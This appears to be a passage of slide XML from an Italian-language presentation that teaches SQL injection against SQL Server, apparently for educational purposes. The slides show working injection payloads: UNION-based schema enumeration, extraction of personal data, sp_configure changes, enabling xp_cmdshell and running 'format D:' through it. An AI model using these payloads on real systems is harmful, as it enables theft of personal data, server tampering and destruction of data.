      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E223A1C8-4328-3852-F322-6FB4778D3ED2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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D732024A-DAC3-9C13-6056-83EE77BB5516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441500" y="2123627"/>
            <a:ext cx="6261000" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, CONCAT(S.name, '.', T.name, '.', C.name), NULL, NULL, NULL, NULL FROM AdventureWorksDW2022.sys.columns C INNER JOIN AdventureWorksDW2022.sys.tables T ON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T.object_id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 =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C.object_id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 INNER JOIN AdventureWorksDW2022.sys.schemas S ON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S.schema_id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 =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T.schema_id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 ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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40807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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BA00D75-EFF3-1640-CE37-BFCD9954B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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5C6A88EF-D502-802C-8A61-ED7FDB658E6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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dati</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dagli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>altri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> database</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA60446D-BF41-D26F-5CF8-81594027249B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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{184703A3-5167-660A-F30A-1C5DE0B43051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441500" y="2123627"/>
            <a:ext cx="6261000" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, CONCAT(FirstName, ' ', LastName, ' (',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EmailAddress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, ') ', AddressLine1, AddressLine2, ', ', City, ', ',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StateProvinceCode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, ' ',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PostalCode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, ' - ', Phone),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BirthDate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, NULL, NULL, NULL FROM AdventureWorksDW2022.dbo.ProspectiveBuyer ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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723292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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F78DFD79-353B-62CC-0721-736AA8D7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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8ABA63F9-EADA-F26D-1300-881CF1B32DA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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>configurazione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del server</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{75206626-351C-3A23-FCD4-29CD94D8DA8F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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{423D1D32-4C31-5793-A659-D290C9691A96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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; EXECUTE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sp_configure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 'show advanced options', 1; RECONFIGURE;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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082596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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC71E470-D6EC-3F1B-75EB-49C445D1E1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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9FBC31F4-831A-CCF6-22E2-1971C95D35C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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>configurazione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del server</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{305C9C47-7F7E-3FB4-447C-309D741D38A5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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5EBA2D4-44EB-7EC5-EC44-1F8A88BED27A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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, CONCAT(C.name, ': ', CONVERT(NVARCHAR, COALESCE(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C.value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,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C.value_in_use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))), NULL, NULL, NULL, NULL FROM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sys.configurations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 C ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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986658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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD52707C-C69C-0C47-787F-092BDD3936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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{271C7CE0-1E80-6E92-9828-F6DD8844912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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Modificare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>configurazione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del server</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC52DF68-7BAD-1806-AD32-BBD0810BA65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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30D300D4-D224-B140-CCFE-259E013E02DF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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; EXECUTE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sp_configure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 'max server memory (MB)’, 128; RECONFIGURE;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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245248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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E719B13-508A-3F58-8A59-963E84E7E5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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C913BCDD-E302-CB36-239C-8BA1038BDF2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5833" y="1490741"/>
            <a:ext cx="7212334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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Windows) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Modificare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>configurazione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del server</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BA5BCA3-4F63-8491-E767-E0CE1EEBD7C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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C88EC712-3446-FBD4-D057-CDB2364CF893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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; EXECUTE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sp_configure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 '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xp_cmdshell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', 1; RECONFIGURE;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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979238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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A760962-B4C4-70C0-2A14-F3D81FD99B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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B511F848-0D52-125A-D156-CEC5D0BB2FE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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Windows) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Eseguire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>comandi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3EBF6ED-7CE5-544D-0879-956B7F72DDB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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B342687-4343-22E3-B13A-A74F905FA663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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; EXECUTE master..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xp_cmdshell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 'format D: \q \u', NO_OUTPUT;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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999990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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA86480F-F968-3F96-96E7-A605D3160E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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B52626A5-45A6-18D0-7613-BFA863290EE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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Elencare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file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server*</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
